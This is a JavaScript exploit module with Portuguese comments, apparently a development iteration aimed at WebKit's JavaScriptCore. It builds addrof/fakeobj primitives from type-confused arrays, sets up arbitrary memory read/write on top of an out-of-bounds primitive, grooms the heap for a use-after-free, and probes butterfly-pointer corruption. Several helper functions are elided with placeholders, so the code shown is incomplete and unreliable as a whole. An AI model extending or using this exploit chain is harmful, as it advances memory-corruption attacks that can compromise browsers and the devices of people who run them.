// js/script3/testArrayBufferVictimCrash.mjs (v06 - Re-inicialização Pós-UAF das Primitivas)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. A v05 falhou porque a UAF corrompeu as próprias primitivas do exploit.
// 2. Nova Estratégia: Robustez.
//    a. A função de grooming é executada para preparar o heap.
//    b. IMEDIATAMENTE APÓS o grooming, as primitivas (victim_array, confused_array)
//       são RE-CRIADAS para garantir que não estejam corrompidas.
//    c. A caça ao Butterfly da v05 é retomada com as primitivas "novas em folha".
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// --- Funções de Conversão e Auxiliares (inalteradas) ---
function int64ToDouble(int64) { /* ... */ }
function doubleToInt64(double) { /* ... */ }
function getSafeOffset(baseObject, path, defaultValue = 0) { /* ... */ }
// ==================================================================

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: v06 - Re-inicialização Pós-UAF das Primitivas ---`, "test");

    let final_result = { /* ... */ };
    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        logS3("PAUSA INICIAL...", "info");
        await PAUSE_S3(1000);
        const LOCAL_JSC_OFFSETS = { 
            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
        };
        
        await triggerOOB_primitive({ force_reinit: true });

        // --- MUDANÇA v06: ESCOPO DAS VARIÁVEIS DAS PRIMITIVAS ---
        let confused_array, victim_array;

        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        
        // Função para inicializar/re-inicializar os arrays base
        const initialize_primitives = () => {
            confused_array = [13.37]; // Array de doubles
            victim_array = [{ a: 1 }]; // Array de objects
            // Força a otimização do JIT para os tipos corretos
            for(let i=0; i<1000; i++) {
                victim_array[0] = {a: i};
                confused_array[0] = 13.37 + i;
            }
            logS3("Primitivas addrof/fakeobj (re)inicializadas.", "info");
        };
        
        // Inicialização inicial para as fases de verificação
        initialize_primitives();

        const arb_read_final = (addr) => { /* ... (código inalterado) ... */ };
        const arb_write_final = (addr, value) => { /* ... (código inalterado) ... */ };
        logS3("Primitivas L/E Arbitrária prontas.", "good");
        
        logS3("--- FASE 4: Verificando L/E antes do UAF... ---", "subtest");
        // ... Verificação de L/E ...
        logS3("Verificação de L/E pré-UAF bem-sucedida.", "good");


        // --- FASE 5: ESTRATÉGIA ROBUSTA ---
        logS3("--- FASE 5: Explorando a UAF com primitivas re-inicializadas ---", "subtest");

        const testes_ativos = { tentativa_5_UAF_Robust_Control: true };
        const do_grooming = async (grooming_id) => { /* ... (código inalterado) ... */ };

        if (testes_ativos.tentativa_5_UAF_Robust_Control) {
            logS3("--- INICIANDO TENTATIVA 5 (v06): Controle Robusto via Butterfly ---", "test");
            
            await do_grooming(5);

            logS3("Grooming concluído. Re-inicializando primitivas em heap pós-UAF...", "info");
            
            // ==================================================================
            // PASSO CRÍTICO DA v06: RE-INICIALIZAÇÃO DAS PRIMITIVAS
            initialize_primitives();
            // ==================================================================

            try {
                const UAF_WRITE_PATTERN = new AdvancedInt64(0xABCD1234, 0x5678EFAB);
                
                const target_obj = { original_prop: 1337 };
                const target_obj_addr = addrof(target_obj);
                logS3(`Endereço do objeto alvo UAF (pós-reinicialização): ${target_obj_addr.toString(true)}`, "info");

                const butterfly_ptr_addr = target_obj_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
                const corrupted_butterfly_addr = arb_read_final(butterfly_ptr_addr);
                logS3(`Ponteiro Butterfly (potencialmente corrompido) lido: ${corrupted_butterfly_addr.toString(true)}`, "leak");

                if (corrupted_butterfly_addr.equals(AdvancedInt64.Zero) || corrupted_butterfly_addr.equals(NEW_POLLUTION_VALUE)) {
                    throw new Error(`Ponteiro do Butterfly é nulo ou um valor de poluição conhecido.`);
                }

                logS3(`Tentando escrever o padrão ${UAF_WRITE_PATTERN.toString(true)}...`, "info");
                target_obj.uaf_property = int64ToDouble(UAF_WRITE_PATTERN);
                logS3("Escrita no objeto UAF não crashou. Verificando a memória do Butterfly...", "good");

                let found = false;
                const SCAN_RANGE = 0x80;
                logS3(`Varrendo memória ao redor do endereço do Butterfly: ${corrupted_butterfly_addr.toString(true)}`, "debug");

                for (let offset = -SCAN_RANGE; offset <= SCAN_RANGE; offset += 8) {
                    // ... (lógica de varredura inalterada) ...
                }

                if (!found) {
                    throw new Error("Padrão de escrita não foi encontrado na memória do Butterfly.");
                }

            } catch (uaf_control_e) {
                logS3(`Falha na tentativa de controle do Butterfly UAF: ${uaf_control_e.message}`, "critical");
                final_result.message = `Falha na tentativa de controle do Butterfly UAF: ${uaf_control_e.message}`;
            }
        }

    } catch (e) {
        final_result.message = `Exceção crítica na cadeia de exploração: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
